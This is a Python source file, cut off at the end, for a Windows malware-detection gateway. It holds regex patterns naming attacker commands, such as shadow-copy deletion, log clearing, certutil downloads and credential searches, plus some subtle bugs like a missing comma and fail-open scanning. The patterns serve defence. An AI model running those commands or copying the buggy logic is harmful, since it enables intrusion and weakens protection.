import asyncio
import json
import time
import logging
import re
import csv
import ctypes
import win32api
import win32con
import win32process
from datetime import datetime
import hashlib
import threading
import queue
import psutil
import joblib
import aiohttp
import hashlib
import psutil
import socket
from urllib.parse import urlparse
import time
import win32api  # For Windows-specific blocking
import win32con 
import numpy as np
import os
import pathlib
import glob
from dotenv import load_dotenv
load_dotenv()
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler
from entropy_analyzer import EntropyAnalyzer
from vm_manager import VirtualBoxManager
from ml_analyzer import MLThreatAnalyzer
from process_analyzer import ProcessTreeAnalyzer
from behavioral_analyzer import BehavioralAnalyzer
from lolbins_ml_integration import LOLBinsDatabase, EnhancedMLThreatAnalyzer
from collections import defaultdict
from lolbin_detector import LOLBinDetector
import keyboard
import requests
import asyncio
from urllib.parse import urlparse
import glob
import pathlib
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler
# Windows API imports for real-time monitoring
kernel32 = ctypes.windll.kernel32
psapi = ctypes.windll.psapi
user32 = ctypes.windll.user32

# Constants for Windows API
PROCESS_CREATE_PROCESS = 0x0080
THREAD_CREATE_THREAD = 0x0002

class RealTimeProcessMonitor:
    def __init__(self, callback):
        self.callback = callback
        self.running = False
        self.hook = None
        
    def start(self):
        self.running = True
        threading.Thread(target=self._setup_hooks, daemon=True).start()
        
    def stop(self):
        self.running = False
        if self.hook:
            user32.UnhookWindowsHookEx(self.hook)
            
    def _setup_hooks(self):
    # Set CBT hook for process creation
        CBTProc = ctypes.WINFUNCTYPE(
            ctypes.c_long, ctypes.c_int, ctypes.c_long, ctypes.c_long
        )
        
        def hook_cb(nCode, wParam, lParam):
            if nCode == win32con.HCBT_CREATEWND:
                try:
                    pid = ctypes.c_ulong()
                    thread_id = user32.GetWindowThreadProcessId(wParam, ctypes.byref(pid))
                    self.callback(pid.value)
                except Exception as e:
                    logging.error(f"Hook error: {e}")
            return user32.CallNextHookEx(self.hook, nCode, wParam, lParam)
        
        hook_proc = CBTProc(hook_cb)
        self.hook = user32.SetWindowsHookExA(
            win32con.WH_CBT,
            hook_proc,
            None,
            0
        )
        
        # Message loop using ctypes structure
        class MSG(ctypes.Structure):
            _fields_ = [
                ("hwnd", ctypes.c_void_p),
                ("message", ctypes.c_uint),
                ("wParam", ctypes.c_ulong),
                ("lParam", ctypes.c_ulong),
                ("time", ctypes.c_ulong),
                ("pt", ctypes.c_ulong)
            ]
        
        msg = MSG()
        pMsg = ctypes.pointer(msg)
        
        while self.running:
            if user32.PeekMessageA(pMsg, 0, 0, 0, win32con.PM_REMOVE):
                user32.TranslateMessage(pMsg)
                user32.DispatchMessageA(pMsg)
            time.sleep(0.01)
                            
class EnhancedVoltTyphoonDetector:
    def __init__(self):
        # Volt Typhoon specific command patterns
        self.volt_typhoon_patterns = {
            # Network reconnaissance and pivoting
            'network_recon': [
                r'netsh\s+interface\s+portproxy\s+add',
                r'netsh\s+interface\s+portproxy\s+set',
                r'netsh\s+advfirewall\s+firewall\s+add\s+rule',
                r'netsh\s+wlan\s+show\s+profile',
                r'arp\s+-a',
                r'ipconfig\s+/all',
                r'route\s+print',
                r'nbtstat\s+-n',
            ],
            
            # Credential access and lateral movement
            'credential_access': [
                r'nltest\s+/domain_trusts',
                r'nltest\s+/dclist',
                r'net\s+group\s+"domain\s+admins"',
                r'net\s+user\s+/domain',
                r'net\s+accounts\s+/domain',
                r'dsquery\s+user',
                r'dsquery\s+computer',
                r'dsquery\s+group',
                r'net\s+localgroup\s+administrators',
                r'net\s+group\s+"domain\s+controllers"',
                r'net\s+group\s+"enterprise\s+admins"'
            ],
            
            # Persistence mechanisms
            'persistence': [
                r'schtasks\s+/create.*?/sc\s+onlogon',
                r'schtasks\s+/create.*?/ru\s+system',
                r'sc\s+create.*?binpath.*?cmd',
                r'reg\s+add.*?\\run\\',
                r'reg\s+add.*?\\services\\',
                r'wmic\s+service\s+call\s+create',
            ],
            
            # Defense evasion
            'defense_evasion': [
                r'powershell.*?-windowstyle\s+hidden',
                r'powershell.*?-executionpolicy\s+bypass',
                r'powershell.*?-encodedcommand',
                r'certutil.*?-urlcache.*?-split.*?-f',
                r'bitsadmin\s+/transfer',
                r'regsvr32\s+/s\s+/n\s+/u\s+/i:',
                r'mshta\s+vbscript:',
                r'rundll32\s+javascript:',
                r'powershell.*?-nop',
                r'powershell.*?-noexit',
                r'powershell.*?-noni',
                r'powershell.*?-ep\s+bypass',
                r'wmic.*?process.*?call.*?create',
                r'wmic.*?/node:.*?/user:.*?/password:',
                r'vssadmin\s+delete\s+shadows',
                r'bcdedit\s+/set\s+safeboot',
                r'attrib\s+\+s\s+\+h',
                r'icacls\s+.*?/grant',
                r'wevtutil\s+cl\s+system',
                r'wevtutil\s+cl\s+security',
                r'wevtutil\s+cl\s+application',
                r'fsutil\s+usn\s+deletejournal',
                r'net\s+stop\s+\w+',
                r'net\s+start\s+\w+',
                r'certutil.*?encode',
                r'findstr.*?\/V.*?\-',
                r'bitsadmin.*?\/transfer',
                r'curl.*?\-X\s+POST',
                r'schtasks.*?\\Microsoft\\Windows\\Diagnosis',
                r'wevtutil.*?qe.*?EventID\=4624'
            ],
            
            # Discovery and enumeration
            'discovery': [
                r'tasklist\s+/svc',
                r'whoami\s+/all',
                r'whoami\s+/groups',
                r'systeminfo',
                r'wmic\s+computersystem\s+get',
                r'wmic\s+process\s+list\s+full',
                r'net\s+localgroup\s+administrators',
                r'quser',
                r'query\s+session',
                r'net\s+view',
                r'net\s+user',
                r'net\s+group',
                r'net\s+share',
                r'arp\s+-a',
                r'ipconfig\s+/all',
                r'route\s+print',
                r'nbtstat\s+-a',
                r'nbtstat\s+-n',
                r'nbtstat\s+-s',
            ],
            
            # Data exfiltration preparation
            'collection': [
                r'forfiles.*?/m\s+\*\..*?/c\s+"cmd\s+/c',
                r'findstr.*?/s.*?/i.*?password',
                r'dir.*?/s.*?\*\.txt',
                r'copy.*?\\\\.*?\\c\$',
                r'xcopy.*?/s.*?/h.*?/e',
                r'robocopy.*?/mir',
                r'copy\s+.*?\\\\.*?\\admin\$',
                r'copy\s+.*?\\\\.*?\\c\$',
                r'robocopy\s+.*?\\\\.*?\\c\$',
                r'rar\.exe\s+a\s+.*?\.rar',
                r'7z\.exe\s+a\s+.*?\.7z',
                r'winrar\.exe\s+a\s+.*?\.zip',
            ]
        }
        self.ransomware_patterns = {
    'file_encryption': [
        # General encryption patterns
        r'crypt', r'encrypt', r'decrypt', r'aes', r'rsa', r'des', 
        r'\.locked', r'\.encrypted', r'\.crypted', r'\.ransom',
        
        # Small file encryption patterns (NEW)
        r'powershell.*-command.*encrypt.*\.(txt|doc|pdf)',  # Single file encryption
        r'cmd.*copy.*\.(txt|doc|pdf).*\.encrypted',        # File copying to encrypted
        r'certutil.*-encode.*\.(txt|doc|pdf)',             # Base64 encoding of files
        r'powershell.*set-content.*\.(txt|doc|pdf).*\.locked',  # Creating locked files
        r'forfiles.*/m.*\.(txt|doc|pdf).*/c.*copy.*\.encrypted',  # Small batch encryption
        r'robocopy.*\.(txt|doc|pdf).*\.encrypted',         # Robocopy encryption
        r'xcopy.*\.(txt|doc|pdf).*\.locked',               # Xcopy encryption
        r'copy.*\.(txt|doc|pdf).*\.crypted',               # Copy encryption
        
        # File extension targeting (small scale)
        r'\.(txt|doc|docx|pdf|xls|xlsx|ppt|pptx|jpg|png|zip|rar).*\.(encrypted|crypted|locked|ransom)',
        r'powershell.*get-childitem.*\.(txt|doc|pdf).*foreach.*encrypt',
        r'cmd.*dir.*\.(txt|doc|pdf).*for.*encrypt',
        
        # Backup destruction (even small scale)
        r'vssadmin\s+delete\s+shadows',  # Shadow copy deletion
        r'wbadmin\s+delete\s+catalog',    # Backup catalog deletion
        r'fsutil\s+usn\s+deletejournal',   # USN journal deletion
        r'cipher\s+/w',                    # Secure delete
        r'forfiles.*?\.(docx|pdf|xlsx).*?/c\s+"cmd\s+/c\s+del'  # Mass file deletion
        
        # Small scale file operations that could be ransomware
        r'powershell.*remove-item.*\.(txt|doc|pdf)',       # Small file deletion
        r'cmd.*del.*\.(txt|doc|pdf)',                      # Small file deletion
        r'powershell.*move-item.*\.(txt|doc|pdf).*\.encrypted',  # Move to encrypted
        r'cmd.*move.*\.(txt|doc|pdf).*\.locked',           # Move to locked
    ],
    'ransom_note_patterns': [
        r'readme\.txt', r'how_to_decrypt\.html', r'_restore_instructions_',
        r'!!!_warning_!!!', r'your_files_are_encrypted', r'decrypt_instructions',
        r'pay_ransom', r'bitcoin', r'payment_required', r'unlock_files',
        r'crypto_locker', r'crypto_wall', r'locky', r'cerber',
        r'decrypt.*txt', r'unlock.*txt', r'ransom.*txt', r'payment.*txt'
    ],
    'ransomware_process_chains': [
        ('explorer.exe', 'cmd.exe', 'cipher.exe'),
        ('svchost.exe', 'powershell.exe', 'certutil.exe'),
        ('services.exe', 'wmic.exe', 'vssadmin.exe'),
        # Small scale encryption chains
        ('explorer.exe', 'cmd.exe', 'copy.exe'),
        ('explorer.exe', 'powershell.exe', 'set-content'),
        ('explorer.exe', 'certutil.exe', '-encode'),
        ('explorer.exe', 'robocopy.exe', '/move'),
    ]
}
        # Suspicious process chains specific to Volt Typhoon
        self.volt_process_chains = [
            ('explorer.exe', 'cmd.exe', 'netsh.exe'),
            ('winlogon.exe', 'cmd.exe', 'nltest.exe'),
            ('services.exe', 'svchost.exe', 'powershell.exe'),
            ('lsass.exe', 'cmd.exe', 'tasklist.exe'),
            ('spoolsv.exe', 'cmd.exe', 'sc.exe'),
            ('svchost.exe', 'cmd.exe', 'reg.exe'),
            ('explorer.exe', 'wscript.exe', 'cscript.exe'),
            ('services.exe', 'cmd.exe', 'schtasks.exe')
        ]
        
        # Network indicators
        self.suspicious_network_patterns = [
            r'(\d{1,3}\.){3}\d{1,3}:443',  # Suspicious HTTPS connections
            r'(\d{1,3}\.){3}\d{1,3}:80',   # Suspicious HTTP connections
            r'tunnel|proxy|socks',          # Tunneling keywords
        ]

    def analyze_for_volt_typhoon(self, process_info, command_line):
        """Enhanced analysis specifically for Volt Typhoon TTPs"""
        risk_score = 0.0
        detected_patterns = []
        
        cmd_lower = command_line.lower()
        process_name = process_info.get('name', '').lower()
        
        # Check for Volt Typhoon command patterns
        for category, patterns in self.volt_typhoon_patterns.items():
            for pattern in patterns:
                if isinstance(pattern, (list, tuple)):
                    for p in pattern:
                        if re.search(p, command_line, re.IGNORECASE):
                            risk_score += 3.0
                            detected_patterns.append({
                                'category': category,
                                'pattern': p,
                                'severity': 'HIGH'
                            })
                else:
                    if re.search(pattern, command_line, re.IGNORECASE):
                        risk_score += 3.0
                        detected_patterns.append({
                            'category': category,
                            'pattern': pattern,
                            'severity': 'HIGH'
                        })
        
        # Check for suspicious timing (Volt Typhoon often operates during off-hours)
        current_hour = datetime.now().hour
        if current_hour < 6 or current_hour > 22:  # Between 10 PM and 6 AM
            risk_score += 1.0
            detected_patterns.append({
                'category': 'timing',
                'pattern': 'off_hours_activity',
                'severity': 'MEDIUM'
            })
        
        # Check for multiple LOLBins in single command
        lolbin_count = sum(1 for lolbin in self.get_extended_lolbins() 
                          if lolbin in cmd_lower)
        if lolbin_count > 2:
            risk_score += 2.0
            detected_patterns.append({
                'category': 'lolbin_chaining',
                'pattern': f'{lolbin_count}_lolbins_detected',
                'severity': 'HIGH'
            })
        
        # Check for base64 encoded PowerShell (common in Volt Typhoon)
        if 'powershell' in process_name:
            b64_patterns = [
                r'[A-Za-z0-9+/]{50,}={0,2}',  # Base64
                r'-enc.*?[A-Za-z0-9+/]{20,}',  # Encoded command
                r'frombase64string',           # Base64 decoding
                r'convert::frombase64string'   # .NET Base64 decoding
            ]
            for pattern in b64_patterns:
                if isinstance(pattern, (list, tuple)):
                    for p in pattern:
                        if re.search(p, command_line, re.IGNORECASE):
                            risk_score += 2.5
                            detected_patterns.append({
                                'category': 'obfuscation',
                                'pattern': 'base64_encoding',
                                'severity': 'HIGH'
                            })
                            break
                else:
                    if re.search(pattern, command_line, re.IGNORECASE):
                        risk_score += 2.5
                        detected_patterns.append({
                            'category': 'obfuscation',
                            'pattern': 'base64_encoding',
                            'severity': 'HIGH'
                        })
                        break
        
        # Check for command chaining
        if re.search(r'(&&|\|\||;){2,}', command_line):
            risk_score += 1.5
            detected_patterns.append({
                'category': 'chaining',
                'pattern': 'multiple_command_chaining',
                'severity': 'MEDIUM'
            })
        if not isinstance(process_info, dict):
            logging.error(f"Expected dict, got {type(process_info)}: {process_info}")
            return {
                'volt_typhoon_risk_score': 0.0,
                'detected_patterns': [],
                'is_volt_typhoon_like': False
            }    
        
        # Check for hex encoding
        if re.search(r'(0x[0-9a-fA-F]{2,}){4,}', command_line):
            risk_score += 1.5
            detected_patterns.append({
                'category': 'obfuscation',
                'pattern': 'hex_encoding',
                'severity': 'HIGH'
            })
        
        return {
            'volt_typhoon_risk_score': min(risk_score, 10.0),
            'detected_patterns': detected_patterns,
            'is_volt_typhoon_like': risk_score >= 3.0
        }
        
    
    def get_extended_lolbins(self):
        """Extended LOLBins list including recent additions"""
        return [
            # Original list
            #'powershell.exe',
             'cmd.exe', 'mshta.exe', 'wscript.exe', 'cscript.exe',
            'regsvr32.exe', 'rundll32.exe', 'forfiles.exe', 'debug.exe',
            'certutil.exe', 'bitsadmin.exe', 'netsh.exe', 'schtasks.exe',
            'tasklist.exe', 'sc.exe', 'whoami.exe', 'net.exe', 'nltest.exe', 
            'msiexec.exe', 'hh.exe', 'ieexec.exe', 'installutil.exe', 'msxsl.exe',
            'dnscmd.exe', 'diskshadow.exe', 'makecab.exe', 'expand.exe',
            'xwizard.exe', 'cmstp.exe', 'scriptrunner.exe', 'msdt.exe',
            'forfiles.exe', 'reg.exe', 'regedit.exe', 'regedt32.exe',
            
            # Additional LOLBins frequently used by Volt Typhoon
            'wbemtest.exe', 'odbcconf.exe', 'regasm.exe', 'regsvcs.exe',
            'installutil.exe', 'msbuild.exe', 'csi.exe', 'rcsi.exe',
            'winrm.vbs', 'slmgr.vbs', 'pubprn.vbs', 'syncappvpublishingserver.vbs',
            'pnputil.exe', 'fltmc.exe', 'relog.exe', 'wusa.exe',
            'esentutl.exe', 'vsjitdebugger.exe', 'sqldumper.exe',
            'sqlps.exe', 'dtexec.exe', 'dnscmd.exe', 'dsacls.exe',
            'ldifde.exe', 'csvde.exe', 'adplus.exe', 'appvlp.exe',
            
            # Additional high-risk LOLBins
            'msbuild.exe', 'installutil.exe', 'regasm.exe', 'regsvcs.exe',
            'msiexec.exe', 'cmstp.exe', 'control.exe'
        ]

class ProcessInterceptor:
    def __init__(self):
        self.process_queue = queue.Queue(maxsize=1000)
        self._seen = set()
        self.running = False
        self.real_time_monitor = RealTimeProcessMonitor(self._process_callback)
        self.high_risk_processes ={p.lower(): d for p, d in {
            # Scripting & Execution
            #'powershell.exe': 'PowerShell execution',
            'cmd.exe': 'Command prompt execution',
            'wmic.exe': 'WMI command execution',
            'regsvr32.exe': 'Registry server execution',
            'rundll32.exe': 'DLL execution',
            'mshta.exe': 'HTML application execution',
            'certutil.exe': 'Certificate utility execution',
            'bitsadmin.exe': 'BITS admin execution',

            # Scheduled tasks & persistence
            'schtasks.exe': 'Scheduled task execution',
            'at.exe': 'Legacy task scheduling',

            # Network configuration & proxy abuse
            'netsh.exe': 'Network configuration',
            'proxycfg.exe': 'Proxy manipulation',
            'ipconfig.exe': 'IP configuration view',
            'route.exe': 'Routing table access',
            'arp.exe': 'ARP cache dump',
            'nbtstat.exe': 'NetBIOS network info',
            'sc.exe': 'Service control',

            # Recon & credential gathering
            'net.exe': 'Network info & shares',
            'net1.exe': 'Legacy network info',
            'whoami.exe': 'Identity check',
            'tasklist.exe': 'Process listing',
            'dsquery.exe': 'AD domain queries',
            'nltest.exe': 'Domain trust relationships',
            'quser.exe': 'User session enumeration',
            
            # Additional high-risk LOLBins
            'msbuild.exe': 'MSBuild script execution',
            'installutil.exe': 'InstallUtil execution',
            'regasm.exe': 'RegAsm execution',
            'regsvcs.exe': 'RegSvcs execution',
            'msiexec.exe': 'MSI package execution',
            'cmstp.exe': 'Connection Manager execution',
            'control.exe': 'Control Panel item execution'
        }.items()}

    def start_interception(self):
        self.running = True
        self.real_time_monitor.start()
        threading.Thread(target=self._poll_processes, daemon=True).start()
    def _process_callback(self, pid):
        """Real-time callback for process creation"""
        try:
            proc = psutil.Process(pid)
            with proc.oneshot():
                cmdline = proc.cmdline()
                process_data = {
                    'name': proc.name(),
                    'pid': pid,
                    'ppid': proc.ppid(),
                    'cmdline': ' '.join(cmdline) if cmdline else '',
                    'is_high_risk': proc.name().lower() in self.high_risk_processes,
                    'create_time': time.time()
                }
                self.process_queue.put(process_data)
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
    def _poll_processes(self):
        """Fast polling for processes not caught by hook"""
        while self.running:
            try:
                current_pids = set(psutil.pids())
                new_pids = current_pids - self._seen
                
                # Process new PIDs in batches for speed
                for pid in list(new_pids)[:30]:  # Increased from 20 to 30
                    try:
                        proc = psutil.Process(pid)
                        if pid not in self._seen and proc.create_time() > time.time() - 2.0:  # Increased time window from 1.0 to 2.0
                            self._process_callback(pid)
                    except Exception:
                        pass
                self._seen = current_pids
            except Exception as e:
                logging.error(f"Polling error: {e}")
            time.sleep(0.001)  # Ultra-fast polling (1ms)

class LOLBinPatternDetector:
    def __init__(self):
        # Use the existing LOLBinDetector instead of importing undefined patterns
        self.lolbin_detector = LOLBinDetector()

    def detect(self, process_name, command_line):
        # Delegate to the existing LOLBinDetector
        result = self.lolbin_detector.detect(process_name, command_line)
        if result and result.get('detected'):
            return True, result.get('matched_pattern')
        return False, None
class AdaptiveSemaphore:
    """Semaphore that adjusts based on system load"""
    def __init__(self, min_tasks=5, max_tasks=50, load_factor=0.7):
        self.min_tasks = min_tasks
        self.max_tasks = max_tasks
        self.load_factor = load_factor
        self.semaphore = asyncio.Semaphore(min_tasks)
        self.adjust_task = None
    async def start_adjusting(self):  # New method to start adjustment
        self.adjust_task = asyncio.create_task(self._adjust_loop())
        
    async def stop_adjusting(self):  # New method to stop adjustment
        if self.adjust_task:
            self.adjust_task.cancel()
            try:
                await self.adjust_task
            except asyncio.CancelledError:
                pass    
    async def _adjust_loop(self):
        while True:
            await asyncio.sleep(5)  # Adjust every 5 seconds
            cpu_load = psutil.cpu_percent() / 100.0
            current_value = self.semaphore._value
            
            if cpu_load < self.load_factor and current_value < self.max_tasks:
                # Increase concurrency
                for _ in range(min(5, self.max_tasks - current_value)):
                    self.semaphore.release()
            elif cpu_load > self.load_factor and current_value > self.min_tasks:
                # Decrease concurrency
                for _ in range(min(5, current_value - self.min_tasks)):
                    await self.semaphore.acquire()
                    
    async def acquire(self):
        await self.semaphore.acquire()
        
    def release(self):
        self.semaphore.release()
        
    async def __aenter__(self):
        await self.acquire()
        
    async def __aexit__(self, exc_type, exc, tb):
        self.release()

class SecurityGateway:
    def __init__(self):
          # FIRST initialize logger
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler('security_gateway.log', encoding='utf-8'),
                logging.StreamHandler()
            ]
        )
        self.logger = logging.getLogger(__name__)
        
        # Core components
        self.process_interceptor = ProcessInterceptor()
        self.lolbin_detector = LOLBinDetector()
        self.vm_manager = VirtualBoxManager()
        self.entropy_analyzer = EntropyAnalyzer()
        self.process_analyzer = ProcessTreeAnalyzer()
        self.lolbins_db = LOLBinsDatabase('full_lolbins_raw.txt')
        self.ml_analyzer = EnhancedMLThreatAnalyzer(self.lolbins_db)
        self.volt_detector = EnhancedVoltTyphoonDetector()
        self.behavioral_analyzer = BehavioralAnalyzer()
        
        # Parallel execution setup
        cpu_count = os.cpu_count() or 4  # Default to 4 if None
        self.cpu_thread_pool = ThreadPoolExecutor(max_workers=cpu_count * 2)
        self.io_thread_pool = ThreadPoolExecutor(max_workers=50)
        # Add true multiprocessing for CPU-intensive tasks
        self.cpu_process_pool = ProcessPoolExecutor(max_workers=cpu_count)
        self.adaptive_semaphore = AdaptiveSemaphore()
        self.active_tasks = set()
        
          # Analysis services configuration
        self.virustotal_api_key = os.getenv("vt")
        self.virustotal_base_url = "https://www.virustotal.com/api/v3/"
        if not self.virustotal_api_key:
             self.logger.warning("VirusTotal API key not found - URL scanning will be disabled")
             self.logger.info("To enable VirusTotal scanning, set the 'vt' environment variable")
        else:
             self.logger.info("VirusTotal API key found - file and URL scanning enabled")
        self.virustotal_cache = {}
        self.min_virustotal_ratio = 0.3  # Increased from 0.1 to 0.3 (30% detection rate)
        
        # Process monitoring configuration
        self.web_processes = {'msedge.exe', 'chrome.exe', 'firefox.exe', 'iexplore.exe', 'opera.exe', 'brave.exe', 'safari.exe'}
        self.download_agents = {'curl.exe', 'wget.exe', 'powershell.exe', 'bitsadmin.exe', 'certutil.exe', 'msedge.exe', 'chrome.exe', 'firefox.exe'}
        self.download_extensions = {'.exe', '.dll', '.msi', '.ps1', '.bat', '.js', '.vbs', '.zip', '.rar', '.7z', '.iso', '.msu', '.cab'}
        
        # Web protection configuration
        self.web_protection_enabled = True
        self.scan_all_websites = False  # Only scan suspicious websites
        self.scan_all_downloads = False  # Only scan suspicious downloads
        self.pre_download_protection_enabled = True  # Enable pre-download protection by default
        self.blocked_domains = set()
        self.scanned_urls = {}  # Cache for URL scan results
        self.scanned_files = {}  # Cache for file scan results
        
        # System state
        self.monitoring_active = False
        self.blocked_ips = set()  # Track blocked malicious IPs

        # Cache for analysis results (file_hash/url -> result)
        self.analysis_cache = {}
        self.cache_ttl = 3600
        
        # Minimum scores for allowance
        self.min_cuckoo_score = 5.0  # Higher is more malicious
        
        # Risk thresholds
        self.risk_thresholds = {
            'allow': 3.0,
            'monitor': 6.0,
            'block': 8.0
        }
        
        # Runtime blocklist
        self.runtime_blocklist = []
        
        # File protection
        self.file_guard = FileGuard()
        threading.Thread(target=self.file_guard.monitor_file_changes, daemon=True).start()
        
        # Enhanced download monitoring
        self.download_monitor = EnhancedDownloadMonitor(self)
        
        # Web protection statistics
        self.web_protection_stats = {
            'urls_scanned': 0,
            'urls_blocked': 0,
            'files_scanned': 0,
            'files_blocked': 0,
            'domains_blocked': 0,
            'processes_terminated': 0
        }
    def start_keyboard_monitor(self):
    
        def monitor():
            print("Press ESC to stop the Security Gateway.")
            keyboard.wait("esc")
            self.logger.info("ESC key pressed. Initiating smooth shutdown with final snapshot...")
            # Trigger smooth shutdown
            self.monitoring_active = False
            self.process_interceptor.running = False
            self.process_interceptor.real_time_monitor.stop()

        threading.Thread(target=monitor, daemon=True).start()
        
    async def _create_final_shutdown_snapshot(self):
        """Create a final snapshot before shutdown to preserve system state"""
        try:
            self.logger.info("Creating final shutdown snapshot...")
            
            # Get current timestamp for snapshot name
            timestamp = int(time.time())
            snapshot_name = f"ShutdownSnapshot_{timestamp}"
            
            # Use the actual VM pool from the VirtualBoxManager
            vm_names = getattr(self.vm_manager, 'vm_pool', [])
            if not vm_names:
                self.logger.warning("No VMs found in pool for final snapshot.")
                return
                
            snapshot_created = False
            
            for vm_name in vm_names:
                try:
                    self.logger.info(f"Attempting final snapshot on VM: {vm_name}")
                    
                    # Check if VM is running, if not start it
                    if not self.vm_manager._is_vm_running(vm_name):
                        self.logger.info(f"Starting VM '{vm_name}' for final snapshot...")
                        result = self.vm_manager._run_vbox_command(["startvm", vm_name, "--type", "headless"], timeout=30)
                        if result['success']:
                            self.logger.info(f"VM '{vm_name}' started successfully")
                            # Wait a moment for VM to fully start
                            await asyncio.sleep(5)
                        else:
                            self.logger.warning(f"Failed to start VM '{vm_name}': {result['error']}")
                            continue
                    
                    # Create snapshot
                    result = self.vm_manager._run_vbox_command([
                        "snapshot", vm_name, "take", snapshot_name, 
                        "--description", f"Final shutdown snapshot - {datetime.now().isoformat()}"
                    ], timeout=60)
                    
                    if result['success']:
                        self.logger.info(f"Final shutdown snapshot '{snapshot_name}' created successfully on VM: {vm_name}")
                        snapshot_created = True
                        break
                    else:
                        self.logger.warning(f"Failed to create final snapshot on VM: {vm_name}, trying next VM")
                        
                except Exception as e:
                    self.logger.error(f"Error creating final snapshot on VM {vm_name}: {e}")
                    continue
            
            if snapshot_created:
                self.logger.info("Final shutdown snapshot created successfully")
            else:
                self.logger.warning("Failed to create final shutdown snapshot on any VM")
                
        except Exception as e:
            self.logger.error(f"Error in final shutdown snapshot creation: {e}")
            
    async def _gracefully_stop_vms(self):
        """Gracefully stop all VMs after final snapshot creation"""
        try:
            self.logger.info("Gracefully stopping VirtualBox VMs...")

            # Use the actual VM pool from the VirtualBoxManager
            vm_names = getattr(self.vm_manager, 'vm_pool', [])
            if not vm_names:
                self.logger.warning("No VMs found in pool for shutdown.")

            for vm_name in vm_names:
                try:
                    # Check if VM is running
                    if self.vm_manager._is_vm_running(vm_name):
                        self.logger.info(f"Stopping VM: {vm_name}")

                        # Try graceful shutdown first
                        shutdown_cmd = [self.vm_manager.vboxmanage_path, "controlvm", vm_name, "acpipowerbutton"]
                        result = self.vm_manager._run_vbox_command(["controlvm", vm_name, "acpipowerbutton"], timeout=30)
                        self.logger.info(f"Shutdown command result for {vm_name}: {result}")

                        if not result['success']:
                            # If graceful shutdown fails, force power off
                            self.logger.warning(f"Graceful shutdown failed for {vm_name}, forcing power off...")
                            poweroff_cmd = [self.vm_manager.vboxmanage_path, "controlvm", vm_name, "poweroff"]
                            result = self.vm_manager._run_vbox_command(["controlvm", vm_name, "poweroff"], timeout=15)
                            self.logger.info(f"Poweroff command result for {vm_name}: {result}")

                        if result['success']:
                            self.logger.info(f"VM '{vm_name}' stopped successfully")
                        else:
                            self.logger.warning(f"Failed to stop VM '{vm_name}': {result['error']}")
                    else:
                        self.logger.info(f"VM '{vm_name}' is not running, skipping.")

                except Exception as e:
                    self.logger.error(f"Error stopping VM {vm_name}: {e}")
                    continue

            self.logger.info("VM shutdown process completed")

        except Exception as e:
            self.logger.error(f"Error in graceful VM shutdown: {e}")
    
                
    async def _check_download_with_virustotal(self, file_path):
        """Check a downloaded file with VirusTotal"""
        if not self.virustotal_api_key or not os.path.exists(file_path):
            return True
            
        # Check cache first
        file_hash = self._calculate_file_hash(file_path)
        if file_hash in self.virustotal_cache:
            cached_result = self.virustotal_cache[file_hash]
            if time.time() - cached_result['timestamp'] < 86400:  # 24 hour cache
                return cached_result['safe']
        
        headers = {
            "x-apikey": self.virustotal_api_key,
            "accept": "application/json"
        }
        
        try:
            # First check if file is already known
            file_url = f"{self.virustotal_base_url}files/{file_hash}"
            async with aiohttp.ClientSession() as session:
                async with session.get(file_url, headers=headers) as resp:
                    if resp.status == 200:
                        data = await resp.json()
                        stats = data.get('data', {}).get('attributes', {}).get('last_analysis_stats', {})
                        malicious = stats.get('malicious', 0)
                        suspicious = stats.get('suspicious', 0)
                        
                        if malicious + suspicious > 0:
                            ratio = (malicious + suspicious) / sum(stats.values())
                            if ratio >= self.min_virustotal_ratio:
                                self.virustotal_cache[file_hash] = {
                                    'safe': False,
                                    'timestamp': time.time(),
                                    'stats': stats
                                }
                                return False
                    
            # If not known, upload for analysis
            upload_url = f"{self.virustotal_base_url}files"
            with open(file_path, 'rb') as f:
                files = {'file': f}
                async with session.post(upload_url, headers=headers, data=files) as resp:
                    if resp.status == 200:
                        data = await resp.json()
                        analysis_id = data.get('data', {}).get('id')
                        
                        # Wait for analysis to complete (poll every 5 seconds for up to 60 seconds)
                        for _ in range(12):
                            await asyncio.sleep(5)
                            analysis_url = f"{self.virustotal_base_url}analyses/{analysis_id}"
                            async with session.get(analysis_url, headers=headers) as analysis_resp:
                                if analysis_resp.status == 200:
                                    analysis_data = await analysis_resp.json()
                                    status = analysis_data.get('data', {}).get('attributes', {}).get('status')
                                    if status == 'completed':
                                        stats = analysis_data.get('data', {}).get('attributes', {}).get('stats', {})
                                        malicious = stats.get('malicious', 0)
                                        suspicious = stats.get('suspicious', 0)
                                        
                                        if malicious + suspicious > 0:
                                            ratio = (malicious + suspicious) / sum(stats.values())
                                            if ratio >= self.min_virustotal_ratio:
                                                self.virustotal_cache[file_hash] = {
                                                    'safe': False,
                                                    'timestamp': time.time(),
                                                    'stats': stats
                                                }
                                                return False
                                        break
                                        
            # If we get here, file is clean
            self.virustotal_cache[file_hash] = {
                'safe': True,
                'timestamp': time.time()
            }
            return True
            
        except Exception as e:
            self.logger.error(f"VirusTotal file check failed for {file_path}: {e}")
            return True  # Allow on failure
            
    def _calculate_file_hash(self, file_path):
        """Calculate SHA256 hash of a file"""
        sha256 = hashlib.sha256()
        with open(file_path, 'rb') as f:
            while chunk := f.read(8192):
                sha256.update(chunk)
        return sha256.hexdigest()
    
    async def _block_ip_wfp(self, ip):
        """Block an IP using Windows Filtering Platform (WFP)"""
        try:
            # Example: Use `netsh` to block IP (replace with proper WFP API calls)
            os.system(f'netsh advfirewall firewall add rule name="BlockMaliciousIP" dir=out action=block remoteip={ip}')
            self.blocked_ips.add(ip)
            self.logger.info(f"Blocked malicious IP: {ip}")
        except Exception as e:
            self.logger.error(f"Failed to block IP {ip}: {e}")
    async def _check_url_realtime(self, url, process_name):
        """Check URL in real-time before download completes"""
        domain = urlparse(url).netloc
        if not domain:
            self.logger.error(f"Invalid domain parsed from URL: {url}")
            return True  # Allow if no domain found
            
        # Step 1: Check if domain is already blocked (but don't block IP immediately)
        if domain in self.virustotal_cache and not self.virustotal_cache[domain]['safe']:
            self.logger.warning(f"Domain {domain} is already known as malicious")
            return False  # Don't block IP, just return False

        # Step 2: Query VirusTotal API (async)
        if not self.virustotal_api_key:
            self.logger.info("VirusTotal API key not configured - allowing URL")
            return True  # Allow if no API key
            
